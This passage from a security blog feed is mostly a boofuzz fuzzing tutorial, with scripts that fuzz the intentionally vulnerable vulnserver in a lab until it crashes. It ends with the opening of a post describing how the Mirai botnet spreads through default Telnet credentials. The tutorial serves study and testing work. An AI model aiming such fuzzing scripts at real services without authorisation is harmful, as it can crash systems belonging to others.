class="string">&quot;AAAA&quot;</span>),</span><br><span class="line">        Static(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">    ))</span><br><span class="line">    <span class="comment"># fmt: on</span></span><br><span class="line"></span><br><span class="line">    session.connect(user)</span><br><span class="line">    session.connect(user, passw)</span><br><span class="line">    session.connect(passw, stor)</span><br><span class="line">    session.connect(passw, retr)</span><br></pre></td></tr></table></figure>
<p>It implements a new and concise method to represent elements in the protocol.</p>
<p>Next we check <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/ftp_with_procmon.py" >ftp_with_procmon.py<i class="fas fa-external-link-alt"></i></a> to learn <code>procmon</code> module:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># it is defined  by </span></span><br><span class="line">procmon = ProcessMonitor(target_ip, <span class="number">26002</span>)</span><br><span class="line">procmon.set_options(start_commands=[start_cmd])</span><br><span class="line"><span class="comment"># and add it to `session` inside a `target`</span></span><br><span class="line">session = Session(</span><br><span class="line">    target=Target(</span><br><span class="line">        connection=TCPSocketConnection(target_ip, <span class="number">21</span>),</span><br><span class="line">        monitors=[procmon],</span><br><span class="line">    ),</span><br><span class="line">    sleep_time=<span class="number">1</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>Besides <code>procmon</code>, there are <code>netmon</code> module and <code>vmcontrol</code> module that we can add to <code>session</code> inside <code>target</code>, we can see it in <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/fuzz_trillian_jabber.py" >fuzz_trillian_jabber.py<i class="fas fa-external-link-alt"></i></a>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_message</span>(<span class="params">sock</span>):</span></span><br><span class="line">    init = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&#x27;</span></span><br><span class="line">    init += <span class="string">&#x27;&lt;stream:stream to=&quot;152.67.137.126&quot; xmlns=&quot;jabber:client&quot; xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock.send(init)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = sessions.Session(session_filename=<span class="string">&quot;audits/trillian.session&quot;</span>)</span><br><span class="line">target = sessions.Target(connection=TCPSocketConnection(<span class="string">&quot;152.67.137.126&quot;</span>, <span class="number">5298</span>))</span><br><span class="line">target.netmon = pedrpc.Client(<span class="string">&quot;152.67.137.126&quot;</span>, <span class="number">26001</span>)</span><br><span class="line">target.procmon = pedrpc.Client(<span class="string">&quot;152.67.137.126&quot;</span>, <span class="number">26002</span>)</span><br><span class="line">target.vmcontrol = pedrpc.Client(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">26003</span>)</span><br><span class="line">target.procmon_options = &#123;<span class="string">&quot;proc_name&quot;</span>: <span class="string">&quot;trillian.exe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># start up the target.</span></span><br><span class="line">target.vmcontrol.restart_target()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;virtual machine up and running&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess.add_target(target)</span><br><span class="line">sess.pre_send = init_message</span><br><span class="line">sess.connect(sess.root, s_get(<span class="string">&quot;chat message&quot;</span>))</span><br><span class="line">sess.fuzz()</span><br></pre></td></tr></table></figure>
<p>Attention: <code>monitor=...</code> is the new method, while <code>procmon=...</code> is deprecated.</p>
<p>The <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/fuzz_ssl_client.py" >fuzz_ssl_client.py<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/fuzz_ssl_server.py" >fuzz_ssl_server.py<i class="fas fa-external-link-alt"></i></a> are about <code>SSL</code>&#x2F;<code>TLS</code> communacations, communate with certificate.</p>
<p>As for <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/fuzz_trend_control_manager_20901.py" >fuzz_trend_control_manager_20901.py<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/fuzz_trend_server_protect_5168.py" >fuzz_trend_server_protect_5168.py<i class="fas fa-external-link-alt"></i></a>, they are just unfinished samples.</p>
<p>Another great example is <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/http_simple.py" >http_simple.py<i class="fas fa-external-link-alt"></i></a> (perhaps with <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/http_with_body.py" >http_with_body.py<i class="fas fa-external-link-alt"></i></a>). It shows us how to use <code>block</code> and <code>group</code>.  </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">define_proto</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="comment"># disable Black formatting to keep custom indentation</span></span><br><span class="line">    <span class="comment"># fmt: off</span></span><br><span class="line">    req = Request(<span class="string">&quot;HTTP-Request&quot;</span>, children=(</span><br><span class="line">        Block(<span class="string">&quot;Request-Line&quot;</span>, children=(</span><br><span class="line">            Group(<span class="string">&quot;Method&quot;</span>, values=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;CONNECT&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>, <span class="string">&quot;TRACE&quot;</span>]),</span><br><span class="line">            Delim(<span class="string">&quot;space-1&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">            String(<span class="string">&quot;URI&quot;</span>, <span class="string">&quot;/index.html&quot;</span>),</span><br><span class="line">            Delim(<span class="string">&quot;space-2&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">            String(<span class="string">&quot;HTTP-Version&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>),</span><br><span class="line">            Static(<span class="string">&quot;CRLF&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">        )),</span><br><span class="line">        Block(<span class="string">&quot;Host-Line&quot;</span>, children=(</span><br><span class="line">            String(<span class="string">&quot;Host-Key&quot;</span>, <span class="string">&quot;Host:&quot;</span>),</span><br><span class="line">            Delim(<span class="string">&quot;space&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">            String(<span class="string">&quot;Host-Value&quot;</span>, <span class="string">&quot;example.com&quot;</span>),</span><br><span class="line">            Static(<span class="string">&quot;CRLF&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">        )),</span><br><span class="line">        Static(<span class="string">&quot;CRLF&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">    ))</span><br><span class="line">    <span class="comment"># fmt: on</span></span><br><span class="line"></span><br><span class="line">    session.connect(req)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">define_proto_static</span>(<span class="params">session</span>):</span></span><br><span class="line">    s_initialize(name=<span class="string">&quot;Request&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&quot;Request-Line&quot;</span>):</span><br><span class="line">        s_group(<span class="string">&quot;Method&quot;</span>, [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;CONNECT&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>, <span class="string">&quot;TRACE&quot;</span>])</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, name=<span class="string">&quot;space-1&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;/index.html&quot;</span>, name=<span class="string">&quot;Request-URI&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, name=<span class="string">&quot;space-2&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;HTTP/1.1&quot;</span>, name=<span class="string">&quot;HTTP-Version&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Request-Line-CRLF&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;Host:&quot;</span>, name=<span class="string">&quot;Host-Line&quot;</span>)</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, name=<span class="string">&quot;space-3&quot;</span>)</span><br><span class="line">        s_string(<span class="string">&quot;example.com&quot;</span>, name=<span class="string">&quot;Host-Line-Value&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>, name=<span class="string">&quot;Host-Line-CRLF&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;Request-CRLF&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(<span class="string">&quot;Request&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>A <code>block</code> combines several <code>primitives</code> which change values randomly, however a <code>group</code> provides the range of values to a variable.</p>
<p>Then we move to <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/iso8385.py" >iso8385.py<i class="fas fa-external-link-alt"></i></a>, it provides us with <code>s_random</code> which defines the length of a <code>primitive</code> to change:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s_random(</span><br><span class="line">    <span class="string">&quot;30 33 32 37 49 53 4F 37 30 31 30 30 30 30 30 31 31 31 30 F6 F3 00 21 8E E1 A0 08 00 00 00 00 00 00 00 01 31 &quot;</span></span><br><span class="line">    <span class="string">&quot;36 34 32 36 30 30 30 30 30 30 31 35 31 30 33 33 35 31 37 30 30 30 30 30 30 30 30 30 30 30 30 31 30 30 30 30 &quot;</span></span><br><span class="line">    <span class="string">&quot;30 30 30 30 30 30 30 31 30 30 30 31 37 30 39 32 37 32 31 35 33 30 30 30 30 30 30 30 31 30 30 30 30 30 30 30 &quot;</span></span><br><span class="line">    <span class="string">&quot;31 30 30 30 39 32 37 31 39 31 31 31 35 31 32 30 30 30 30 31 36 30 34 30 31 31 31 32 31 36 30 36 35 30 30 30 &quot;</span></span><br><span class="line">    <span class="string">&quot;32 30 30 36 30 30 30 30 30 31 30 32 30 36 38 37 30 31 39 31 31 39 31 35 38 34 30 31 39 30 39 32 30 30 31 30 &quot;</span></span><br><span class="line">    <span class="string">&quot;30 30 33 32 30 30 30 30 30 31 35 30 30 30 30 30 30 33 34 30 42 41 4E 41 4E 41 20 52 45 50 55 42 4C 49 43 20 &quot;</span></span><br><span class="line">    <span class="string">&quot;20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 54 59 20 50 52 30 36 32 50 38 37 30 30 31 34 50 32 &quot;</span></span><br><span class="line">    <span class="string">&quot;35 30 30 31 33 50 38 38 30 30 31 34 50 35 34 30 30 31 52 50 39 35 30 30 32 30 31 50 36 38 30 32 30 30 33 30 &quot;</span></span><br><span class="line">    <span class="string">&quot;30 30 39 32 37 30 32 30 36 38 37 30 31 39 31 31 39 38 34 30 38 34 30 30 30 39 30 33 39 30 30 33 39 30 39 36 &quot;</span></span><br><span class="line">    <span class="string">&quot;30 43 30 46 31 31 39&quot;</span>,</span><br><span class="line">    min_length=<span class="number">331</span>,</span><br><span class="line">    max_length=<span class="number">350</span>,</span><br><span class="line">    fuzzable=<span class="literal">True</span>,</span><br><span class="line">    num_mutations=<span class="number">500</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>And <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/mdns.py" >mdns.py<i class="fas fa-external-link-alt"></i></a> provides us with <code>s_word</code>, <code>s_size</code> and <code>s_repeat</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ######## Queries ################</span></span><br><span class="line"><span class="keyword">if</span> s_block_start(<span class="string">&quot;query&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> s_block_start(<span class="string">&quot;name_chunk&quot;</span>):</span><br><span class="line">        s_size(<span class="string">&quot;string&quot;</span>, length=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> s_block_start(<span class="string">&quot;string&quot;</span>):</span><br><span class="line">            s_string(<span class="string">&quot;A&quot;</span> * <span class="number">10</span>)</span><br><span class="line">        s_block_end()</span><br><span class="line">    s_block_end()</span><br><span class="line">    s_repeat(<span class="string">&quot;name_chunk&quot;</span>, min_reps=<span class="number">2</span>, max_reps=<span class="number">4</span>, step=<span class="number">1</span>, fuzzable=<span class="literal">True</span>, name=<span class="string">&quot;aName&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s_group(<span class="string">&quot;end&quot;</span>, values=[<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;\xc0\xb0&quot;</span>])  <span class="comment"># very limited pointer fuzzing</span></span><br><span class="line">    s_word(<span class="number">0xC</span>, name=<span class="string">&quot;Type&quot;</span>, endian=<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    s_word(<span class="number">0x8001</span>, name=<span class="string">&quot;Class&quot;</span>, endian=<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">s_block_end()</span><br><span class="line">s_repeat(<span class="string">&quot;query&quot;</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="number">40</span>, name=<span class="string">&quot;queries&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>More important, it teaches us how to write <code>callback</code> function:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_questions</span>(<span class="params">target, fuzz_data_logger, session, node, edge, *args, **kwargs</span>):</span></span><br><span class="line">    node.names[<span class="string">&quot;Questions&quot;</span>].value = <span class="number">1</span> + node.names[<span class="string">&quot;queries&quot;</span>].current_reps</span><br><span class="line">    node.names[<span class="string">&quot;Authority&quot;</span>].value = <span class="number">1</span> + node.names[<span class="string">&quot;auth_nameservers&quot;</span>].current_reps</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">sess = Session(target=Target(connection=UDPSocketConnection(<span class="string">&quot;224.0.0.251&quot;</span>, <span class="number">5353</span>)))</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;query&quot;</span>), callback=insert_questions)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>To fuzz network protocol, we need to choose a suitable target: <a class="link"   href="https://github.com/stephenbradshaw/vulnserver" >vulnserver<i class="fas fa-external-link-alt"></i></a>, a simple and buggy server program, so it could be a good test target, while not so realworld.</p>
<p>After running, it will listen port 9999.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; .\vulnserver.exe</span><br><span class="line">Starting vulnserver version <span class="number">1.00</span></span><br><span class="line">Called essential <span class="function"><span class="keyword">function</span> <span class="title">dll</span> <span class="title">version</span> <span class="title">1</span>.<span class="title">00</span></span></span><br><span class="line"></span><br><span class="line">This is vulnerable software!</span><br><span class="line"><span class="keyword">Do</span> not allow access from untrusted systems or networks!</span><br><span class="line"></span><br><span class="line">Waiting <span class="keyword">for</span> client connections...</span><br></pre></td></tr></table></figure>
<p>Then we try to connect with <code>nc</code>, and use <code>HELP</code> to see valid commands:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nc x.x.x.x 9999</span><br><span class="line">Welcome to Vulnerable Server! Enter HELP for help.</span><br><span class="line">HELP</span><br><span class="line">Valid Commands:</span><br><span class="line">HELP</span><br><span class="line">STATS [stat_value]</span><br><span class="line">RTIME [rtime_value]</span><br><span class="line">LTIME [ltime_value]</span><br><span class="line">SRUN [srun_value]</span><br><span class="line">TRUN [trun_value]</span><br><span class="line">GMON [gmon_value]</span><br><span class="line">GDOG [gdog_value]</span><br><span class="line">KSTET [kstet_value]</span><br><span class="line">GTER [gter_value]</span><br><span class="line">HTER [hter_value]</span><br><span class="line">LTER [lter_value]</span><br><span class="line">KSTAN [lstan_value]</span><br><span class="line">EXIT</span><br></pre></td></tr></table></figure>
<p>We can see that except <code>HELP</code> and <code>EXIT</code>, other commands need a parameter.<br>We can write script to fuzz every commands:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    port = <span class="number">9999</span></span><br><span class="line">    host = <span class="string">&#x27;x.x.x.x&#x27;</span></span><br><span class="line">    protocol = <span class="string">&#x27;tcp&#x27;</span></span><br><span class="line"></span><br><span class="line">    session = Session(</span><br><span class="line">            target=Target(</span><br><span class="line">                connection = SocketConnection(host, port, proto=protocol),</span><br><span class="line">            ),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;fuzzall&quot;</span>)</span><br><span class="line">    s_group(<span class="string">&quot;verbs&quot;</span>, values=[<span class="string">&quot;STATS&quot;</span>, <span class="string">&quot;RTIME&quot;</span>, <span class="string">&quot;LTIME&quot;</span>, <span class="string">&quot;SRUN&quot;</span>, <span class="string">&quot;TRUN&quot;</span>, <span class="string">&quot;GMON&quot;</span>, <span class="string">&quot;GDOG&quot;</span>, <span class="string">&quot;KSTET&quot;</span>, <span class="string">&quot;GTER&quot;</span>, <span class="string">&quot;HTER&quot;</span>, <span class="string">&quot;LTER&quot;</span>, <span class="string">&quot;KSTAN&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> s_block_start(<span class="string">&quot;body&quot;</span>, group=<span class="string">&quot;verbs&quot;</span>):</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">        s_string(<span class="string">&quot;FUZZ&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s_block_end()</span><br><span class="line">    </span><br><span class="line">    session.connect(s_get(<span class="string">&quot;fuzzall&quot;</span>))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>After starting it we can see both <code>vulnserver</code> terminal and <code>boofuzz</code> script terminal are refreshing quickly.<br>When running <code>boofuzz</code> script, visit <a class="link"   href="http://127.0.0.1:26000/" >http://127.0.0.1:26000/<i class="fas fa-external-link-alt"></i></a> to check the fuzzing status.<br>![boofuzz Fuzz Control](&#x2F;imghost&#x2F;fbss&#x2F;boofuzz Fuzz Control.png)<br>But we have waited for a long time and found nothing, because of the big range of our test. So we choose to fuzz only 1 command: <code>TRUN</code>. The script changes to be:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    port = <span class="number">9999</span></span><br><span class="line">    host = <span class="string">&#x27;x.x.x.x&#x27;</span></span><br><span class="line">    protocol = <span class="string">&#x27;tcp&#x27;</span></span><br><span class="line"></span><br><span class="line">    session = Session(</span><br><span class="line">            target=Target(</span><br><span class="line">                connection = SocketConnection(host, port, proto=protocol),</span><br><span class="line">            ),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;trun&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;TRUN&quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">    s_string(<span class="string">&quot;FUZZ&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(<span class="string">&quot;trun&quot;</span>))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>It will quickly crash the <code>vulnserver.exe</code> but script keeps running without any signals or pauses. Here we add a <code>callback</code> function for more detailed outputs, to help locating crashing point:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_banner</span>(<span class="params">target, my_logger, session, *args, **kwargs</span>):</span></span><br><span class="line">    banner_template = <span class="string">&quot;Welcome to Vulnerable Server! Enter HELP for help.&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        banner = target.recv(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unable to connect. Target is down. Exiting.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    my_logger.log_check(<span class="string">&#x27;Receiving banner..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> banner_template <span class="keyword">in</span> <span class="built_in">str</span>(banner):</span><br><span class="line">        my_logger.log_pass(<span class="string">&#x27;banner received&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        my_logger.log_fail(<span class="string">&#x27;No banner received&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;No banner received, exiting..&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># remember to add it in session</span></span><br><span class="line">session.connect(s_get(<span class="string">&quot;trun&quot;</span>), callback=get_banner)</span><br></pre></td></tr></table></figure>
<p>We can even add log recording and process monitor, before it we should know how to <a class="link"   href="https://boofuzz.readthedocs.io/en/stable/user/install.html#process-monitor-py-windows-only" >install<i class="fas fa-external-link-alt"></i></a> and use <code>process_monitor.py</code>.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">csv_log = <span class="built_in">open</span>(<span class="string">&#x27;fuzz_results.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line">my_logger = [FuzzLoggerCsv(file_handle=csv_log)]   </span><br><span class="line">session = Session(</span><br><span class="line">        target=Target(</span><br><span class="line">            connection = SocketConnection(host, port, proto=protocol),</span><br><span class="line">            procmon=pedrpc.Client(host, <span class="number">26002</span>),</span><br><span class="line">            procmon_options = &#123;</span><br><span class="line">                    <span class="string">&quot;proc_name&quot;</span> : <span class="string">&quot;vulnserver.exe&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;stop_commands&quot;</span> : [<span class="string">&#x27;wmic process where (name=&quot;vulnserver&quot;) delete&#x27;</span>],</span><br><span class="line">                    <span class="string">&quot;start_commands&quot;</span> : [<span class="string">&#x27;vulnserver.exe&#x27;</span>],</span><br><span class="line">            &#125;</span><br><span class="line">        ),</span><br><span class="line">        fuzz_loggers=my_logger, </span><br><span class="line">        crash_threshold_element= <span class="number">1</span>,<span class="comment"># Crash how much times until stop</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>Have to start process monitor on the target first.</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; python process_monitor.py</span><br><span class="line">$ python process_monitor_unix.py</span><br></pre></td></tr></table></figure>
<p>So our final script comes:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    port = <span class="number">9999</span></span><br><span class="line">    host = <span class="string">&#x27;192.168.100.79&#x27;</span></span><br><span class="line">    protocol = <span class="string">&#x27;tcp&#x27;</span></span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;trun&quot;</span>)</span><br><span class="line">    s_group(<span class="string">&quot;verbs&quot;</span>, values=[<span class="string">&quot;TRUN&quot;</span>,<span class="string">&quot;GMON&quot;</span>,<span class="string">&quot;KSTET&quot;</span>])</span><br><span class="line">    <span class="comment"># s_group(&quot;verbs&quot;, values=[&quot;STATS&quot;, &quot;RTIME&quot;, &quot;LTIME&quot;, &quot;SRUN&quot;, &quot;TRUN&quot;, &quot;GMON&quot;, &quot;GDOG&quot;, &quot;KSTET&quot;, &quot;GTER&quot;, &quot;HTER&quot;, &quot;LTER&quot;, &quot;KSTAN&quot;])</span></span><br><span class="line">    <span class="keyword">if</span> s_block_start(<span class="string">&quot;body&quot;</span>, group=<span class="string">&quot;verbs&quot;</span>):</span><br><span class="line">        s_delim(<span class="string">&quot; &quot;</span>, fuzzable=<span class="literal">False</span>)</span><br><span class="line">        s_string(<span class="string">&quot;FUZZ&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s_block_end()</span><br><span class="line">    </span><br><span class="line">    csv_log = <span class="built_in">open</span>(<span class="string">&#x27;fuzz_results.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line">    my_logger = [FuzzLoggerCsv(file_handle=csv_log)]   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(my_logger))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(my_logger))</span><br><span class="line">    session = Session(</span><br><span class="line">            target=Target(</span><br><span class="line">                connection = SocketConnection(host, port, proto=protocol),</span><br><span class="line">                procmon=pedrpc.Client(host, <span class="number">26002</span>),</span><br><span class="line">                procmon_options = &#123;</span><br><span class="line">                        <span class="string">&quot;proc_name&quot;</span> : <span class="string">&quot;vulnserver.exe&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;stop_commands&quot;</span> : [<span class="string">&#x27;wmic process where (name=&quot;vulnserver&quot;) delete&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;start_commands&quot;</span> : [<span class="string">&#x27;vulnserver.exe&#x27;</span>],</span><br><span class="line">                &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="comment"># fuzz_loggers=my_logger, </span></span><br><span class="line">                <span class="comment"># Well, this statement doesn&#x27;t work fine on Python3</span></span><br><span class="line">                <span class="comment"># Perhaps it is deprecated, or perhaps I wrongly used it</span></span><br><span class="line">                <span class="comment"># Need you guys help !!!</span></span><br><span class="line">            crash_threshold_element= <span class="number">1</span>,<span class="comment"># Crash how much times until stop</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(<span class="string">&quot;trun&quot;</span>), callback=get_banner)</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_banner</span>(<span class="params">target, my_logger, session, *args, **kwargs</span>):</span></span><br><span class="line">    banner_template = <span class="string">&quot;Welcome to Vulnerable Server! Enter HELP for help.&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        banner = target.recv(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unable to connect. Target is down. Exiting.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    my_logger.log_check(<span class="string">&#x27;Receiving banner..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> banner_template <span class="keyword">in</span> <span class="built_in">str</span>(banner):</span><br><span class="line">        my_logger.log_pass(<span class="string">&#x27;banner received&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        my_logger.log_fail(<span class="string">&#x27;No banner received&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;No banner received, exiting..&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><a class="link"   href="https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/" >Boofuzz – A helpful guide (OSCE – CTP)<i class="fas fa-external-link-alt"></i></a> is the reference of the codes.</p>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
        <tag>boofuzz</tag>
        <tag>sulley</tag>
      </tags>
  </entry>
  <entry>
    <title>Build Mirai Botnet and Try It</title>
    <url>/2020/12/03/2020-12-03-Build-Mirai-Botnet-and-Try-It/</url>
    <content><![CDATA[<p>Mirai is a self-spreading botnet virus. The Mirai botnet code contaminates inadequately secured web gadgets by utilizing telnet to discover those that are as yet utilizing their default username and password. The success of Mirai is because of its capacity to contaminate a huge number of these insecure gadgets and coordinate them to mount a DDOS attack against a picked unfortunate victim.<br><img src="/imghost/bmbti/botnet.jpg" alt="IoT botnet"><br>Mirai took advantage of these vulnerable IoT devices in a simple but brilliant way. Rather than trying to use complicated techniques to monitor IoT devices, it examined each bot for open Telnet slots, then tried to log in using 61 random username&#x2F;password combinations that are frequently used as the standard for these devices. In this way, it was able to generate a military of impacted closed-circuit TV digital cameras and routers, prepared to do its bidding.</p>
